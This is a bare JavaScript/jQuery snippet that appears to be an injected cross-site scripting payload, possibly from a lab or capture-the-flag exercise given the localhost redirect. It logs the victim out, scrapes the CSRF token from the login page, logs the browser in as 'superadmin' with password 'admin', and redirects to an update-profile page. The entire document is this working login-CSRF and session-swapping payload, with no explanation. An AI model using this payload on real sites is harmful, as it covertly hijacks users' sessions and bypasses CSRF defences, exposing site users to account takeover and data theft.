if (typeof window.run === "undefined") {
    window.run = true;
    var csrfReg = /\"csrfToken\" value=\"(.*)\"/;
    $.ajax({
        cache: false,
        method: "GET",
        url: "/logout"
    }).then(() => {
        $.ajax({
            cache: false,
            method: "GET",
            url: "/login"
        }).then(data => {
            let match = data.match(csrfReg);
            return match[1]
        }).then(csrfToken => {
            $.ajax({
                cache: false,
                method: "POST",
                url: "/login",
                data: {
                    csrfToken: csrfToken,
                    username: "superadmin",
                    password: "admin"
                }
            }).then(() => {
                window.location.replace("http://localhost:8080/update-profile");
            });
        });
    });
}